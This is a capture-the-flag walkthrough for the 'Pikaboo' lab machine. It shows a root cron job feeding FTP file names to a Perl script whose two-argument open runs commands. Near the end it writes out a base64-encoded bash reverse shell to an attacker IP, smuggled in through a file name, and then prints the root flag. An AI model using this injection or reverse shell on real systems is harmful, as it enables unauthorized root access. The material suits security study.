# # `Enumeration` -

```bash
www-data@pikaboo:/home/pwnmeow$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```

We see a crontab running as root let's check that out -

```bash
www-data@pikaboo:/usr/local/bin$ cat csvupdate_cron 
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

it is just a simple bash script to run another script /usr/local/bin/csvupdate with the filename as the parameter for the files in FTP and now as we have access to FTP we might be able to exploit it.

- Its taking basename
- The file extension should be .csv

### /usr/local/bin/csvupdate -

```perl
www-data@pikaboo:/usr/local/bin$ cat csvupdate                                                                                                                
#!/usr/bin/perl                                                                                                                                               
                                                                                                                                                              
##################################################################                                                                                            
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #                                                                                            
#                                                                #                                                                                            
# Usage:                                                         #                                                                                            
# ./csvupdate <type> <file(s)>                                   #                                                                                            
#                                                                #                                                                                            
# Arguments:                                                     #                                                                                            
# - type: PokeAPI CSV file type                                  #                                                                                            
#         (must have the correct number of fields)               #                                                                                            
# - file(s): list of files containing CSV data                   #                                                                                            
##################################################################                                                                                            
                                                                                                                                                              
use strict;                                                                                                                                                   
use warnings;                                                                                                                                                 
use Text::CSV;                                                                                                                                                
                                                                                                                                                              
my $csv_dir = "/opt/pokeapi/data/v2/csv";
<SNIP>
if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```

# Exploit -
Refrences -
- [Perl Open Injection](https://stackoverflow.com/questions/26614348/perl-open-injection-prevention)
- [Two Argument](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543)

Perl’s `open` command can, for some crazy reason, be used to execute code. If a command starts with `|`, then the rest of the command will be executed, with anything written to the resulting handle being passed to the executed command’s STDIN. If the filename ends with `|`, then the stuff before is executed, and the output of the execution can be read from the filehandle.

The exploit basically is that if the filename starts with '|' then the rest of file name will be executed as command rather than the file name itself.

Testing with ping -

![[Pasted image 20211211025237.png]]

## Getting a Reverse Shell -

Using base64 to encode our reverse shell to avoid bad characters

```bash
root@napster:~/Documents/HTB/Pikaboo# echo 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzkwMDEgMD4mMQo=
````

And starting our listener

![[Pasted image 20211211031014.png]]

```bash
cd /root/
root@pikaboo:~# ls
ls
root.txt
vsftpd.log
root@pikaboo:~# cat root.txt
cat root.txt
9ef004bdf720b6919d3e84a06bdef95f
```